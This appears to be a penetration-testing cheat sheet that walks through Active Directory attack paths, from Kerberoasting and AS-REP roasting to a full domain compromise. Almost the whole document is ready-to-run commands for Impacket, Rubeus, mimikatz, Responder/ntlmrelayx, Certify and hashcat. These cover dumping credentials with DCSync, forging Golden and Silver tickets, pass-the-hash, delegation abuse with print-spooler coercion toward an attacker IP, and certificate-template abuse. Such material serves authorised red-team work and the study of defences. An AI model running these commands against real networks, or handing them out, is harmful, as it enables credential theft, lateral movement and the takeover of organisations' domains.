# Active Directory Attack Paths

> *"Active Directory is a kingdom. Every kingdom has paths to the throne."*

## Attack Path Overview

```
┌─────────────────────────────────────────────────────────────────┐
│                   AD ATTACK PATH PROGRESSION                    │
├─────────────────────────────────────────────────────────────────┤
│  INITIAL ACCESS                                                │
│  └─> User Credentials (phishing, password spray)              │
│                                                                 │
│  ENUMERATION                                                   │
│  └─> BloodHound, LDAP queries, SPN scanning                   │
│                                                                 │
│  CREDENTIAL HARVESTING                                         │
│  └─> Kerberoasting, AS-REP, LLMNR poisoning                   │
│                                                                 │
│  LATERAL MOVEMENT                                              │
│  └─> Pass-the-Hash, PSExec, WMI                               │
│                                                                 │
│  PRIVILEGE ESCALATION                                          │
│  └─> ACL abuse, delegation abuse, local privesc              │
│                                                                 │
│  DOMAIN COMPROMISE                                             │
│  └─> DCSync, Golden Ticket, domain admin                      │
│                                                                 │
│  PERSISTENCE                                                   │
│  └─> Skeleton Key, AdminSDHolder, Group Policy                │
└─────────────────────────────────────────────────────────────────┘
```

## Path 1: Kerberoasting to Domain Admin

### Prerequisites
- Domain user credentials (any user)

### Steps

1. **Enumerate SPN accounts**
```bash
# Kali
GetUserSPNs.py domain/user:password -dc-ip $DC

# Windows
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

2. **Request TGS tickets**
```bash
# Kali
GetUserSPNs.py domain/user:password -dc-ip $DC -request -outputfile kerberoast.txt

# Windows
.\Rubeus.exe kerberoast /outfile:hashes.txt
```

3. **Crack service account passwords**
```bash
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

4. **Use service account (often has elevated privileges)**
```bash
psexec.py domain/svc_account:password@$TARGET
```

---

## Path 2: AS-REP Roasting

### Prerequisites
- List of usernames (no password required)

### Steps

1. **Find AS-REP vulnerable accounts**
```bash
# Kali
GetNPUsers.py domain/ -usersfile users.txt -dc-ip $DC -no-pass

# Windows
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}
```

2. **Request AS-REP for vulnerable accounts**
```bash
# Kali
GetNPUsers.py domain/ -usersfile users.txt -dc-ip $DC -format hashcat -outputfile asrep.txt

# Windows
.\Rubeus.exe asreproast /outfile:hashes.txt
```

3. **Crack hashes**
```bash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

---

## Path 3: LLMNR/NBT-NS Poisoning to Relay

### Prerequisites
- Network access (same subnet as targets)

### Steps

1. **Start Responder (capture mode)**
```bash
# Disable SMB in Responder.conf first
sudo responder -I eth0 -r -d -w
```

2. **Start relay attack**
```bash
# Target list (SMB signing disabled)
nmap --script smb2-security-mode -p445 192.168.1.0/24

# Start relay
sudo ntlmrelayx.py -tf targets.txt -smb2support -i
```

3. **Access relayed sessions**
```bash
# Interactive shell
nc 127.0.0.1 11000
```

---

## Path 4: DCSync Attack

### Prerequisites
- Account with replication rights (Domain Admin, or specific ACL)

### Steps

1. **Verify replication rights**
```powershell
# Check if user has rights
Get-ObjectAcl -DistinguishedName "dc=domain,dc=local" -ResolveGUIDs | ?{$_.ObjectAceType -match "Replication"}
```

2. **Perform DCSync**
```bash
# Kali - All users
secretsdump.py domain/user:password@$DC -just-dc

# Kali - Specific user (krbtgt for Golden Ticket)
secretsdump.py domain/user:password@$DC -just-dc-user krbtgt

# Windows (mimikatz)
lsadump::dcsync /user:krbtgt /domain:domain.local
```

---

## Path 5: Golden Ticket Attack

### Prerequisites
- KRBTGT hash (from DCSync)
- Domain SID

### Steps

1. **Get domain SID**
```powershell
# PowerShell
Get-ADDomain | Select-Object DomainSID

# Using impacket
lookupsid.py domain/user:password@$DC
```

2. **Create Golden Ticket**
```bash
# Kali
ticketer.py -nthash $KRBTGT_HASH -domain-sid $SID -domain domain.local administrator

# Windows (mimikatz)
kerberos::golden /user:administrator /domain:domain.local /sid:$SID /krbtgt:$HASH /ptt
```

3. **Use Golden Ticket**
```bash
# Set KRB5CCNAME
export KRB5CCNAME=administrator.ccache

# Access target
psexec.py domain.local/administrator@$DC -k -no-pass
```

---

## Path 6: Silver Ticket Attack

### Prerequisites
- Service account hash (NTLM)
- Domain SID

### Steps

1. **Create Silver Ticket for specific service**
```bash
# Kali
ticketer.py -nthash $SERVICE_HASH -domain-sid $SID -domain domain.local -spn cifs/$TARGET.domain.local user

# Windows (mimikatz)
kerberos::golden /user:user /domain:domain.local /sid:$SID /target:$TARGET /service:cifs /rc4:$HASH /ptt
```

---

## Path 7: Pass-the-Hash

### Prerequisites
- NTLM hash of target user

### Steps

```bash
# Kali
psexec.py -hashes :$NTLM_HASH domain/user@$TARGET
wmiexec.py -hashes :$NTLM_HASH domain/user@$TARGET
smbexec.py -hashes :$NTLM_HASH domain/user@$TARGET

# Windows (mimikatz)
sekurlsa::pth /user:user /domain:domain.local /ntlm:$HASH
```

---

## Path 8: Overpass-the-Hash (Pass-the-Key)

### Prerequisites
- NTLM hash of target user

### Steps

1. **Request TGT with hash**
```bash
# Kali
getTGT.py -hashes :$NTLM_HASH domain/user

# Windows
.\Rubeus.exe asktgt /user:user /rc4:$HASH /ptt
```

2. **Use TGT**
```bash
export KRB5CCNAME=user.ccache
psexec.py -k -no-pass domain/user@$TARGET
```

---

## Path 9: Delegation Abuse

### Types
- Unconstrained Delegation
- Constrained Delegation
- Resource-Based Constrained Delegation (RBCD)

### Unconstrained Delegation

```powershell
# Find unconstrained delegation
Get-ADComputer -Filter {TrustedForDelegation -eq $true}

# Print spooler attack
# On attacker (Rubeus monitor)
.\Rubeus.exe monitor /interval:5

# Trigger SpoolSample
.\SpoolSample.exe $DC $ATTACKER_IP
```

### Constrained Delegation

```bash
# Find constrained delegation
Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo

# S4U attack
.\Rubeus.exe s4u /user:svc$ /rc4:$HASH /impersonateuser:administrator /msdsspn:cifs/$TARGET /ptt
```

---

## Path 10: ADCS (Certificate Services) Abuse

### ESC1: Misconfigured Certificate Templates

```powershell
# Find vulnerable templates
.\Certify.exe find /vulnerable

# Request certificate as another user
.\Certify.exe request /ca:CA-NAME /template:VulnerableTemplate /altname:administrator

# Convert and use
# openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
# .\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /ptt
```

---

## BloodHound Queries

### Find Shortest Paths

```cypher
# Shortest path to Domain Admin
MATCH p=shortestPath((n)-[*1..]->(m:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p

# Kerberoastable paths
MATCH (u:User {hasspn:true})-[r:MemberOf*1..]->(g:Group) WHERE g.name CONTAINS 'ADMIN' RETURN u.name,g.name

# AS-REP roastable
MATCH (u:User {dontreqpreauth:true}) RETURN u.name

# Unconstrained delegation
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name
```

---

## Quick Reference

| Attack | Required | Impact |
|--------|----------|--------|
| Kerberoasting | Domain user | Service account compromise |
| AS-REP Roast | Username list | User account compromise |
| LLMNR Poison | Network access | Credential capture |
| DCSync | Replication rights | Full domain compromise |
| Golden Ticket | KRBTGT hash | Persistent domain access |
| Silver Ticket | Service hash | Service access |
| Pass-the-Hash | NTLM hash | Lateral movement |
| Unconstrained Del | Delegation rights | Domain compromise |
| ADCS Abuse | Vulnerable templates | Domain compromise |
